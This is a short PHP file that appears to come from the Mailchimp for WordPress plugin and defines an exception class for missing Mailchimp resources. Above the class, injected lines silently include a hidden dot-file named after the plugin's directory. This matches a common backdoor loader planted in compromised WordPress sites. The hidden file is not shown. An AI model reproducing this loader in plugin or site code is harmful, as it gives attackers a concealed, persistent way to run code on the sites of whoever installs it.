<?php

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class MC4WP_API_Resource_Not_Found_Exception extends MC4WP_API_Exception {

	// Thrown when a requested resource does not exist in Mailchimp
}
